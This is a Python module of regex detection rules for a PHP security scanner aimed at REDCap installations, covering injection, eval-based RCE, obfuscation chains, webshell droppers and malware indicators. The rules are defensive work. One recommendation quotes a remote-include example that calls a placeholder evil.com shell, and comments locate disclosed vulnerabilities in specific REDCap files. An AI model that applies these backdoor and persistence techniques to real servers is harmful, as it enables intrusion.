"""
Security scanner rule definitions — pure data module.

Extracted from :class:`forensics.security_scanner.SecurityScanner` (Step 5.6)
so the 40+ regex rule definitions live in their own auditable file, separate
from the scanning engine logic.

Each rule is a dict with:
    - ``id``             — unique rule identifier (SEC001‒SEC099)
    - ``severity``       — CRITICAL / HIGH / MEDIUM / LOW / INFO
    - ``category``       — injection, rce, xss, credentials, etc.
    - ``pattern``        — compiled :class:`re.Pattern`
    - ``message``        — human-readable description
    - ``cwe``            — CWE identifier (optional)
    - ``recommendation`` — remediation guidance (optional)

To add a rule, append a dict to :data:`SECURITY_RULES`.  No changes to
``SecurityScanner`` are required.
"""

from __future__ import annotations

import re

# ═══════════════════════════════════════════════════════════════════════════
# Rule definitions
# ═══════════════════════════════════════════════════════════════════════════

SECURITY_RULES: list[dict[str, object]] = [
    # -----------------------------------------------------------------------
    # CRITICAL
    # -----------------------------------------------------------------------
    {
        "id": "SEC001",
        "severity": "CRITICAL",
        "category": "injection",
        "pattern": re.compile(
            r"""(?:mysql_query|mysqli_query|pg_query)\s*\([^)]*\$_(?:GET|POST|REQUEST|COOKIE)""",
            re.IGNORECASE,
        ),
        "message": "Direct user input in SQL query (SQL Injection)",
        "cwe": "CWE-89",
        "recommendation": "Use parameterized queries or prepared statements",
    },
    {
        "id": "SEC002",
        "severity": "CRITICAL",
        "category": "rce",
        "pattern": re.compile(r"""\b(?:eval|assert)\s*\(\s*\$""", re.IGNORECASE),
        "message": "Dynamic code execution with variable input",
        "cwe": "CWE-94",
        "recommendation": "Remove eval/assert with user-controlled input",
    },
    {
        "id": "SEC003",
        "severity": "CRITICAL",
        "category": "rce",
        "pattern": re.compile(
            r"""(?<!->)(?<!::)\b(?:exec|system|passthru|shell_exec|popen|proc_open)\s*\(\s*\$""",
            re.IGNORECASE,
        ),
        "message": "OS command injection risk - variable in command execution",
        "cwe": "CWE-78",
        "recommendation": "Use escapeshellarg/escapeshellcmd or avoid dynamic commands",
    },
    {
        "id": "SEC004",
        "severity": "CRITICAL",
        "category": "credentials",
        "pattern": re.compile(
            r"""(?:password|passwd|secret_key|api_key|private_key|auth_token)\s*[=:]\s*['"][A-Za-z0-9+/=]{8,}['"]""",
            re.IGNORECASE,
        ),
        "message": "Hardcoded credential or secret detected",
        "cwe": "CWE-798",
        "recommendation": "Move secrets to environment variables or secure vault",
    },
    # -----------------------------------------------------------------------
    # HIGH
    # -----------------------------------------------------------------------
    {
        "id": "SEC010",
        "severity": "HIGH",
        "category": "xss",
        "pattern": re.compile(
            r"""echo\s+\$_(?:GET|POST|REQUEST|COOKIE)\s*\[""", re.IGNORECASE
        ),
        "message": "Reflected XSS - echoing user input without sanitization",
        "cwe": "CWE-79",
        "recommendation": "Use htmlspecialchars() or htmlentities()",
    },
    {
        "id": "SEC011",
        "severity": "HIGH",
        "category": "file_inclusion",
        "pattern": re.compile(
            r"""(?:include|require)(?:_once)?\s*[\(]?\s*\$_(?:GET|POST|REQUEST)""",
            re.IGNORECASE,
        ),
        "message": "Local/Remote File Inclusion via user input",
        "cwe": "CWE-98",
        "recommendation": "Never use user input in include/require paths",
    },
    {
        "id": "SEC012",
        "severity": "HIGH",
        "category": "deserialization",
        "pattern": re.compile(r"""\bunserialize\s*\(\s*\$""", re.IGNORECASE),
        "message": "Unsafe deserialization of variable data",
        "cwe": "CWE-502",
        "recommendation": "Use json_decode instead or validate before unserialize",
    },
    {
        "id": "SEC013",
        "severity": "HIGH",
        "category": "upload",
        "pattern": re.compile(
            r"""move_uploaded_file\s*\(.*?\$_(?:FILES|GET|POST)""", re.IGNORECASE
        ),
        "message": "File upload handling - verify file type validation",
        "cwe": "CWE-434",
        "recommendation": "Validate file type, extension, MIME, and content",
    },
    {
        "id": "SEC014",
        "severity": "HIGH",
        "category": "crypto",
        "pattern": re.compile(
            r"""\b(?:md5|sha1)\s*\(\s*\$.*password""", re.IGNORECASE
        ),
        "message": "Weak hashing for password storage",
        "cwe": "CWE-328",
        "recommendation": "Use password_hash() with PASSWORD_BCRYPT or PASSWORD_ARGON2ID",
    },
    # -----------------------------------------------------------------------
    # MEDIUM
    # -----------------------------------------------------------------------
    {
        "id": "SEC020",
        "severity": "MEDIUM",
        "category": "injection",
        "pattern": re.compile(
            r"""\$_(?:GET|POST|REQUEST|COOKIE)\s*\[.*?\](?!.*(?:htmlspecialchars|htmlentities|filter_|intval|escape|sanitize))""",
            re.IGNORECASE,
        ),
        "message": "User input used without visible sanitization",
        "cwe": "CWE-20",
        "recommendation": "Always sanitize/validate user input",
    },
    {
        "id": "SEC021",
        "severity": "MEDIUM",
        "category": "session",
        "pattern": re.compile(
            r"""session_start\s*\(\s*\)(?!.*session_regenerate_id)""", re.IGNORECASE
        ),
        "message": "Session started without regeneration (fixation risk)",
        "cwe": "CWE-384",
        "recommendation": "Call session_regenerate_id() after authentication",
    },
    {
        "id": "SEC022",
        "severity": "MEDIUM",
        "category": "config",
        "pattern": re.compile(
            r"""(?:display_errors|error_reporting)\s*[=(]\s*(?:1|true|E_ALL|on)""",
            re.IGNORECASE,
        ),
        "message": "Error display enabled (information disclosure)",
        "cwe": "CWE-209",
        "recommendation": "Disable display_errors in production",
    },
    {
        "id": "SEC023",
        "severity": "MEDIUM",
        "category": "deprecated",
        "pattern": re.compile(
            r"""\b(?:mysql_connect|mysql_query|mysql_fetch|mysql_select_db|ereg|split)\s*\(""",
            re.IGNORECASE,
        ),
        "message": "Deprecated PHP function usage",
        "cwe": "CWE-477",
        "recommendation": "Use modern equivalents (mysqli, PDO, preg_*)",
    },
    # -----------------------------------------------------------------------
    # LOW
    # -----------------------------------------------------------------------
    {
        "id": "SEC030",
        "severity": "LOW",
        "category": "debug",
        "pattern": re.compile(
            r"""\b(?:var_dump|print_r|debug_print_backtrace|debug_zval_dump)\s*\(""",
            re.IGNORECASE,
        ),
        "message": "Debug function in code",
        "recommendation": "Remove debug functions from production code",
    },
    {
        "id": "SEC031",
        "severity": "LOW",
        "category": "header",
        "pattern": re.compile(r"""header\s*\(\s*['"]X-Powered-By""", re.IGNORECASE),
        "message": "Server information disclosure via header",
        "recommendation": "Remove X-Powered-By headers",
    },
    # -----------------------------------------------------------------------
    # INFO — Backdoor indicators
    # -----------------------------------------------------------------------
    {
        "id": "SEC040",
        "severity": "INFO",
        "category": "backdoor",
        "pattern": re.compile(
            r"""\b(?:base64_decode|gzinflate|gzuncompress|str_rot13)\s*\(\s*(?:base64_decode|gzinflate)""",
            re.IGNORECASE,
        ),
        "message": "Nested encoding/compression (potential obfuscation/backdoor)",
        "cwe": "CWE-506",
        "recommendation": "Investigate - common backdoor technique",
    },
    {
        "id": "SEC041",
        "severity": "INFO",
        "category": "backdoor",
        "pattern": re.compile(
            r"""(?:preg_replace|preg_replace_callback)\s*\([^)]*['\"].*?/e['\"]""",
            re.IGNORECASE,
        ),
        "message": "preg_replace with /e modifier (code execution)",
        "cwe": "CWE-94",
        "recommendation": "Use preg_replace_callback instead",
    },
    # -----------------------------------------------------------------------
    # INFINITERED-specific IoC rules
    # -----------------------------------------------------------------------
    {
        "id": "SEC060",
        "severity": "CRITICAL",
        "category": "infinitered",
        "pattern": re.compile(
            r"""REDCAP[_-]TOKEN|redcap[_-]token""",
        ),
        "message": "INFINITERED IoC: REDCAP-TOKEN string detected",
        "cwe": "CWE-506",
        "recommendation": "Known INFINITERED malware indicator - investigate immediately",
    },
    {
        "id": "SEC061",
        "severity": "CRITICAL",
        "category": "infinitered",
        "pattern": re.compile(
            r"""\beval\s*\(\s*(?:gzinflate|gzuncompress)\s*\(\s*base64_decode""",
            re.IGNORECASE,
        ),
        "message": "INFINITERED IoC: eval(gzinflate(base64_decode())) chain",
        "cwe": "CWE-506",
        "recommendation": "Known INFINITERED payload delivery pattern - isolate and analyze",
    },
    {
        "id": "SEC062",
        "severity": "HIGH",
        "category": "infinitered",
        "pattern": re.compile(
            r"""redcap\.db|redcap_\.db""",
            re.IGNORECASE,
        ),
        "message": "INFINITERED IoC: redcap.db persistence artifact reference",
        "cwe": "CWE-506",
        "recommendation": "SQLite database used for INFINITERED C2/persistence - investigate",
    },
    # -----------------------------------------------------------------------
    # Debug/development tool detection (should not be in production)
    # -----------------------------------------------------------------------
    {
        "id": "SEC063",
        "severity": "HIGH",
        "category": "debug_tool",
        "pattern": re.compile(
            r"""\bKint::|\\Kint\\|kint-php|(?<![a-zA-Z_])d\(\s*\$|Kint\\Renderer""",
            re.IGNORECASE,
        ),
        "message": "Kint debug tool detected in codebase",
        "cwe": "CWE-489",
        "recommendation": "Remove debug tools from production - information disclosure risk",
    },
    {
        "id": "SEC064",
        "severity": "CRITICAL",
        "category": "info_disclosure",
        "pattern": re.compile(
            r"""filp[/\\]whoops|PrettyPageHandler|Whoops\\Run|new\s+Whoops""",
            re.IGNORECASE,
        ),
        "message": "Whoops error handler detected (information disclosure)",
        "cwe": "CWE-209",
        "recommendation": "Remove Whoops from production - exposes stack traces, env vars, credentials",
    },
    {
        "id": "SEC065",
        "severity": "MEDIUM",
        "category": "config_exposure",
        "pattern": re.compile(
            r"""Dotenv\\Dotenv|vlucas[/\\]phpdotenv|Dotenv::create""",
            re.IGNORECASE,
        ),
        "message": "phpdotenv detected - anomalous for REDCap (uses database.php)",
        "cwe": "CWE-538",
        "recommendation": "REDCap uses database.php for config - .env may indicate tampering",
    },
    {
        "id": "SEC066",
        "severity": "HIGH",
        "category": "infinitered",
        "pattern": re.compile(
            r"""SQLite format 3|PRAGMA\s+journal_mode|sqlite_master""",
            re.IGNORECASE,
        ),
        "message": "SQLite operations detected - check for INFINITERED redcap.db artifact",
        "cwe": "CWE-506",
        "recommendation": "Unexpected SQLite usage may indicate INFINITERED persistence layer",
    },
    # -----------------------------------------------------------------------
    # PsySH interactive shell (should never be in production)
    # -----------------------------------------------------------------------
    {
        "id": "SEC067",
        "severity": "CRITICAL",
        "category": "debug_tool",
        "pattern": re.compile(
            r"""psy[/\\]psysh|Psy\\Shell|\\PsySH|psysh\.php|Psy\\Configuration""",
            re.IGNORECASE,
        ),
        "message": "PsySH interactive PHP shell detected in codebase",
        "cwe": "CWE-489",
        "recommendation": "Remove PsySH from production - provides full interactive PHP REPL access",
    },
    # -----------------------------------------------------------------------
    # Symfony debug/var-dumper in production
    # -----------------------------------------------------------------------
    {
        "id": "SEC068",
        "severity": "HIGH",
        "category": "debug_tool",
        "pattern": re.compile(
            r"""Symfony\\Component\\VarDumper|symfony[/\\]var-dumper|\bdump\s*\(\s*\$""",
            re.IGNORECASE,
        ),
        "message": "Symfony VarDumper detected - debug tool in codebase",
        "cwe": "CWE-489",
        "recommendation": "Remove VarDumper from production - information disclosure risk",
    },
    {
        "id": "SEC069",
        "severity": "HIGH",
        "category": "debug_tool",
        "pattern": re.compile(
            r"""Symfony\\Component\\Debug\\Debug|Debug::enable\(\)|Symfony\\Component\\Debug\\ErrorHandler""",
            re.IGNORECASE,
        ),
        "message": "Symfony Debug component detected in production code",
        "cwe": "CWE-489",
        "recommendation": "Symfony Debug is deprecated and exposes stack traces - remove from production",
    },
    # ===================================================================
    # SEC070-SEC079: REDCap Changelog-Disclosed Vulnerability Detection
    # Sourced from REDCap release notes v15.9.2 through v16.1.3
    # All vulnerabilities confirmed present in v15.7.4 baseline
    # ===================================================================
    # CRITICAL: Cookie-based PHP deserialization RCE (16.1.1 fix)
    # Confirmed in: Authentication.php (two_factor_auth_trust cookie),
    #               FhirCookieDTO.php (CDIS/EHR cookie)
    {
        "id": "SEC070",
        "severity": "CRITICAL",
        "category": "deserialization_rce",
        "pattern": re.compile(
            r"""unserialize\s*\(\s*(?:decrypt|base64_decode)?\s*\(?\s*\$_COOKIE""",
            re.IGNORECASE,
        ),
        "message": "Cookie-based PHP deserialization RCE (REDCap CVE disclosed 16.1.1)",
        "cwe": "CWE-502",
        "recommendation": "CVE: Cookie manipulation enables RCE via unserialize on CDIS/Duo pages (13.8.1+). "
        "Replace unserialize() with json_decode() for cookie data",
    },
    # CRITICAL: RCE via REDCap logic evaluation (16.1.0 fix)
    # Confirmed in: DataExport.php eval('$result = '.$actualFormula.';');
    #               init_functions.php eval($eval_string);
    #               LogicParser.php (calc/branching logic)
    {
        "id": "SEC071",
        "severity": "CRITICAL",
        "category": "rce_logic",
        "pattern": re.compile(
            r"""\beval\s*\(\s*['"]?\s*\$(?:result|eval_string|formula|actualFormula|calc)""",
            re.IGNORECASE,
        ),
        "message": "RCE via logic/calculation eval (REDCap CVE disclosed 16.1.0 - ALL versions)",
        "cwe": "CWE-94",
        "recommendation": "CVE: Manipulating calculations, branching logic, DQ rules, or report filters "
        "enables arbitrary PHP code execution. Use a safe math parser instead of eval()",
    },
    # CRITICAL: Generic eval with string concatenation (RCE via logic variant)
    # Catches eval('$result = ' . $formula . ';') patterns
    {
        "id": "SEC072",
        "severity": "CRITICAL",
        "category": "rce_logic",
        "pattern": re.compile(
            r"""\beval\s*\(\s*['"][^'"]*\s*['"]?\s*\.\s*\$""",
            re.IGNORECASE,
        ),
        "message": "Eval with string concatenation - dynamic code assembly (RCE risk)",
        "cwe": "CWE-94",
        "recommendation": "CVE (16.1.0): Dynamic eval via string concatenation enables RCE. "
        "Refactor to use safe expression evaluation without eval()",
    },
    # MAJOR: SQL injection in Data Quality module (16.1.1 fix)
    # Confirmed in: 6 DataQuality/*.php files with SQL operations
    {
        "id": "SEC073",
        "severity": "HIGH",
        "category": "injection",
        "pattern": re.compile(
            r"""(?:db_query|mysqli?_query|query)\s*\([^)]*\$_(?:GET|POST|REQUEST).*(?:DataQuality|data_quality|dq_rule)""",
            re.IGNORECASE,
        ),
        "message": "SQL injection in Data Quality module (REDCap CVE disclosed 16.1.1)",
        "cwe": "CWE-89",
        "recommendation": "CVE: HTTP request manipulation on Data Quality pages enables SQL injection. "
        "Use parameterized queries for all DQ module database operations",
    },
    # MEDIUM: Path traversal in AI features (16.1.1 fix)
    # Confirmed in: AI/summarize_data.php, AI/text_enhancer.php, AI/translator.php
    {
        "id": "SEC074",
        "severity": "MEDIUM",
        "category": "path_traversal",
        "pattern": re.compile(
            r"""(?:file_get_contents|fopen|readfile|include|require)\s*\(.*\$.*(?:report|summarize|ai_|translate)""",
            re.IGNORECASE,
        ),
        "message": "Path traversal risk in AI/report feature (REDCap CVE disclosed 16.1.1)",
        "cwe": "CWE-22",
        "recommendation": "CVE: AI 'Summarize Data' feature allows limited path traversal on reports (15.0.0+). "
        "Validate and canonicalize all file paths before access",
    },
    # MAJOR: Stored XSS via Messenger endpoints (16.1.1 fix)
    # Confirmed in: 4 Messenger/*.php files with output operations
    {
        "id": "SEC075",
        "severity": "HIGH",
        "category": "xss",
        "pattern": re.compile(
            r"""(?:echo|print)\s+.*(?:messenger|thread|message_body|conversation)(?!.*htmlspecialchars)""",
            re.IGNORECASE,
        ),
        "message": "Stored XSS risk in Messenger output (REDCap CVE disclosed 16.1.1)",
        "cwe": "CWE-79",
        "recommendation": "CVE: Stored XSS via REDCap Messenger endpoints (all versions). "
        "Apply htmlspecialchars() to all messenger content output",
    },
    # MAJOR: PDF JavaScript injection via INLINE action tag (16.0.9 fix)
    # Confirmed in: 11 files with PDF+INLINE patterns (PDF.php, DataEntry.php, etc.)
    {
        "id": "SEC076",
        "severity": "HIGH",
        "category": "xss",
        "pattern": re.compile(
            r"""@INLINE\b.*(?:pdf|PDF|action_tag)|(?:pdf|PDF).*@INLINE""",
            re.IGNORECASE,
        ),
        "message": "PDF JavaScript injection via @INLINE action tag (REDCap CVE disclosed 16.0.9)",
        "cwe": "CWE-79",
        "recommendation": "CVE: Reflected XSS via JavaScript embedded in PDF through INLINE action tag. "
        "Sanitize PDF content and strip JavaScript from inline-rendered PDFs",
    },
    # HIGH: getUserRights() empty array bypass (16.0.4 fix)
    # Confirmed in: 7 files including ExternalModules framework
    {
        "id": "SEC077",
        "severity": "HIGH",
        "category": "authorization",
        "pattern": re.compile(
            r"""getUserRights\s*\(""",
            re.IGNORECASE,
        ),
        "message": "getUserRights() usage - vulnerable to empty array bypass (16.0.0-16.0.3)",
        "cwe": "CWE-285",
        "recommendation": "CVE (16.0.4): getUserRights() can return empty array, causing External Modules, "
        "hooks, and plugins to treat users as having no restrictions. Validate return is non-empty",
    },
    # MAJOR: File export API privilege bypass (16.0.9 fix)
    {
        "id": "SEC078",
        "severity": "HIGH",
        "category": "authorization",
        "pattern": re.compile(
            r"""(?:file_export|edoc|download).*(?:No\s*Access|access_level|user_rights)""",
            re.IGNORECASE,
        ),
        "message": "File export access control check (REDCap CVE disclosed 16.0.9)",
        "cwe": "CWE-285",
        "recommendation": "CVE: File/document exports for file-type fields bypass 'No Access' rights check. "
        "Verify export APIs enforce field-level access controls",
    },
    # HIGH: Arbitrary email From address via AJAX (16.1.2 fix)
    {
        "id": "SEC079",
        "severity": "HIGH",
        "category": "injection",
        "pattern": re.compile(
            r"""(?:mail|sendmail|send_email|Email::send)\s*\(.*\$_(?:GET|POST|REQUEST).*(?:from|sender)""",
            re.IGNORECASE,
        ),
        "message": "Email From address injection via AJAX endpoint (REDCap CVE disclosed 16.1.2)",
        "cwe": "CWE-20",
        "recommendation": "CVE: AJAX endpoint allows sending emails with arbitrary From address. "
        "Validate From address against authenticated project users",
    },
    # ===================================================================
    # SEC080-SEC099: Configuration Persistence & PHP Runtime Detection
    # Covers attack categories C (Config Persistence) and F (PHP Runtime)
    # ===================================================================
    # CRITICAL: auto_prepend_file in .htaccess (invisible backdoor)
    {
        "id": "SEC080",
        "severity": "CRITICAL",
        "category": "persistence",
        "pattern": re.compile(
            r"""php_value\s+auto_prepend_file""",
            re.IGNORECASE,
        ),
        "message": "auto_prepend_file directive — persistent invisible code execution on every request",
        "cwe": "CWE-94",
        "recommendation": "CONCLUSIVE persistence indicator. Identify the prepended file immediately.",
    },
    # CRITICAL: auto_append_file in .htaccess
    {
        "id": "SEC081",
        "severity": "CRITICAL",
        "category": "persistence",
        "pattern": re.compile(
            r"""php_value\s+auto_append_file""",
            re.IGNORECASE,
        ),
        "message": "auto_append_file directive — persistent code execution after every request",
        "cwe": "CWE-94",
        "recommendation": "CONCLUSIVE persistence indicator. The appended file executes after every page.",
    },
    # CRITICAL: auto_prepend_file in .user.ini
    {
        "id": "SEC082",
        "severity": "CRITICAL",
        "category": "persistence",
        "pattern": re.compile(
            r"""auto_prepend_file\s*=""",
            re.IGNORECASE,
        ),
        "message": "auto_prepend_file in .user.ini — invisible persistent backdoor via PHP-FPM",
        "cwe": "CWE-94",
        "recommendation": "CONCLUSIVE. REDCap ships NO .user.ini files. This is persistence via PHP runtime.",
    },
    # CRITICAL: allow_url_include enabled
    {
        "id": "SEC083",
        "severity": "CRITICAL",
        "category": "rfi",
        "pattern": re.compile(
            r"""allow_url_include\s*=\s*(?:1|on|true)""",
            re.IGNORECASE,
        ),
        "message": "allow_url_include enabled — remote file inclusion possible",
        "cwe": "CWE-98",
        "recommendation": "CONCLUSIVE. Allows include('http://evil.com/shell.php'). Must be Off.",
    },
    # HIGH: stream_wrapper_register (protocol hijacking)
    {
        "id": "SEC084",
        "severity": "HIGH",
        "category": "persistence",
        "pattern": re.compile(
            r"""\bstream_wrapper_register\s*\(""",
            re.IGNORECASE,
        ),
        "message": "Custom stream wrapper registration — potential protocol hijacking",
        "cwe": "CWE-94",
        "recommendation": "REDCap should not register custom stream wrappers. Investigate purpose.",
    },
    # HIGH: set_include_path manipulation
    {
        "id": "SEC085",
        "severity": "HIGH",
        "category": "persistence",
        "pattern": re.compile(
            r"""\b(?:set_include_path|ini_set\s*\(\s*['"]include_path)\s*\(""",
            re.IGNORECASE,
        ),
        "message": "include_path manipulation — potential directory shadow attack",
        "cwe": "CWE-426",
        "recommendation": "Modified include_path can cause PHP to load attacker files instead of legitimate ones.",
    },
    # HIGH: dl() dynamic extension loading (should be disabled in web context)
    {
        "id": "SEC086",
        "severity": "HIGH",
        "category": "persistence",
        "pattern": re.compile(
            r"""\bdl\s*\(\s*['"]""",
            re.IGNORECASE,
        ),
        "message": "Dynamic PHP extension loading via dl() — should never appear in web code",
        "cwe": "CWE-94",
        "recommendation": "dl() loads arbitrary .so/.dll extensions. Must be disabled in production.",
    },
    # HIGH: AddHandler enabling PHP execution in non-standard context
    {
        "id": "SEC087",
        "severity": "HIGH",
        "category": "config_tamper",
        "pattern": re.compile(
            r"""AddHandler\s+.*php""",
            re.IGNORECASE,
        ),
        "message": "AddHandler enabling PHP execution — may allow PHP in upload directories",
        "cwe": "CWE-434",
        "recommendation": "Check if this enables PHP execution in upload/temp directories.",
    },
    # HIGH: SetHandler enabling PHP
    {
        "id": "SEC088",
        "severity": "HIGH",
        "category": "config_tamper",
        "pattern": re.compile(
            r"""SetHandler\s+.*php""",
            re.IGNORECASE,
        ),
        "message": "SetHandler enabling PHP execution in directory",
        "cwe": "CWE-434",
        "recommendation": "Verify this doesn't enable PHP execution where uploads are stored.",
    },
    # MEDIUM: ProxyPass directive (potential C2 reverse proxy)
    {
        "id": "SEC089",
        "severity": "MEDIUM",
        "category": "config_tamper",
        "pattern": re.compile(
            r"""ProxyPass\s+""",
            re.IGNORECASE,
        ),
        "message": "ProxyPass directive — potential reverse proxy to external C2",
        "cwe": "CWE-441",
        "recommendation": "Verify this doesn't proxy requests to attacker-controlled servers.",
    },
    # HIGH: RewriteRule to external URL (phishing/C2 redirect)
    {
        "id": "SEC090",
        "severity": "HIGH",
        "category": "config_tamper",
        "pattern": re.compile(
            r"""RewriteRule\s+.*https?://""",
            re.IGNORECASE,
        ),
        "message": "RewriteRule redirecting to external URL — potential C2 or phishing",
        "cwe": "CWE-601",
        "recommendation": "External redirects in .htaccess may redirect users to phishing clones.",
    },
    # HIGH: php_flag engine on (enabling PHP in upload dirs)
    {
        "id": "SEC091",
        "severity": "HIGH",
        "category": "config_tamper",
        "pattern": re.compile(
            r"""php_flag\s+engine\s+on""",
            re.IGNORECASE,
        ),
        "message": "PHP engine explicitly enabled — dangerous in upload/temp directories",
        "cwe": "CWE-434",
        "recommendation": "edocs/temp directories should have 'php_flag engine off'.",
    },
    # HIGH: disable_functions override in .user.ini
    {
        "id": "SEC092",
        "severity": "HIGH",
        "category": "config_tamper",
        "pattern": re.compile(
            r"""disable_functions\s*=""",
            re.IGNORECASE,
        ),
        "message": "disable_functions override — potentially removing security restrictions",
        "cwe": "CWE-693",
        "recommendation": "Overriding disable_functions in .user.ini can re-enable exec/system/etc.",
    },
    # CRITICAL: MySQL INTO OUTFILE/DUMPFILE (disk write from SQL)
    {
        "id": "SEC093",
        "severity": "CRITICAL",
        "category": "injection",
        "pattern": re.compile(
            r"""\bINTO\s+(?:OUTFILE|DUMPFILE)\s""",
            re.IGNORECASE,
        ),
        "message": "MySQL INTO OUTFILE/DUMPFILE — writes files to disk from SQL query",
        "cwe": "CWE-89",
        "recommendation": "Attacker with DB access can write webshells directly via SQL. Investigate context.",
    },
    # HIGH: create_function() backdoor
    {
        "id": "SEC094",
        "severity": "HIGH",
        "category": "backdoor",
        "pattern": re.compile(
            r"""\bcreate_function\s*\(""",
            re.IGNORECASE,
        ),
        "message": "create_function() usage — deprecated, commonly used in backdoors",
        "cwe": "CWE-94",
        "recommendation": "create_function() is deprecated and executes arbitrary code. Use closures instead.",
    },
    # HIGH: Variable function calls ($$var() or $var())
    {
        "id": "SEC095",
        "severity": "HIGH",
        "category": "backdoor",
        "pattern": re.compile(
            r"""\$\{?\$\w+\}?\s*\(""",
            re.IGNORECASE,
        ),
        "message": "Variable function call — can invoke arbitrary functions dynamically",
        "cwe": "CWE-94",
        "recommendation": "Variable function calls like $$func() can disguise calls to eval/exec/system.",
    },
    # MEDIUM: open_basedir override
    {
        "id": "SEC096",
        "severity": "MEDIUM",
        "category": "config_tamper",
        "pattern": re.compile(
            r"""open_basedir\s*=""",
            re.IGNORECASE,
        ),
        "message": "open_basedir override — weakening filesystem access restrictions",
        "cwe": "CWE-693",
        "recommendation": "Overriding open_basedir can allow PHP to access files outside the webroot.",
    },
    # HIGH: Composer post-install/update scripts (supply chain)
    {
        "id": "SEC097",
        "severity": "HIGH",
        "category": "supply_chain",
        "pattern": re.compile(
            r"""["']post-(?:install|update)-cmd["']""",
            re.IGNORECASE,
        ),
        "message": "Composer post-install/update script — executes during dependency installation",
        "cwe": "CWE-506",
        "recommendation": "Post-install scripts in composer.json can execute arbitrary code during updates.",
    },
    # HIGH: file_put_contents to PHP file (webshell drop)
    {
        "id": "SEC098",
        "severity": "HIGH",
        "category": "webshell",
        "pattern": re.compile(
            r"""file_put_contents\s*\([^)]*\.php""",
            re.IGNORECASE,
        ),
        "message": "file_put_contents writing .php file — potential webshell dropper",
        "cwe": "CWE-94",
        "recommendation": "Writing PHP files dynamically is a common webshell deployment technique.",
    },
    # CRITICAL: Obfuscation chains (multiple nested decode/decompress calls)
    {
        "id": "SEC099",
        "severity": "CRITICAL",
        "category": "obfuscation",
        "pattern": re.compile(
            r"""(?:str_rot13|gzinflate|gzuncompress|rawurldecode)\s*\(\s*(?:str_rot13|gzinflate|gzuncompress|rawurldecode|base64_decode)\s*\(""",
            re.IGNORECASE,
        ),
        "message": "Multi-layer obfuscation chain — strong indicator of packed malware",
        "cwe": "CWE-506",
        "recommendation": "Nested encoding/compression chains are the hallmark of PHP backdoors.",
    },
]
